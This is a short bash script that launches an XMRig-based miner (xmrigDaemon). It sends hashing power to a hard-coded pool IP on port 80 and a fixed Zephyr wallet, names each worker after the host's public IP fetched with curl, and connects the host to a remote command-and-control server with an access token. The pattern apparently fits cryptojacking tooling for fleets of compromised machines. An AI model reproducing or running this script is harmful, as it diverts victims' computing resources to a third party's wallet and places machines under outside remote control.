#!/bin/bash
POOL=stratum+ssl://172.200.229.146:80
WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=172.200.229.146:2012 --cc-access-token=kevin --cc-worker-id=${myip}
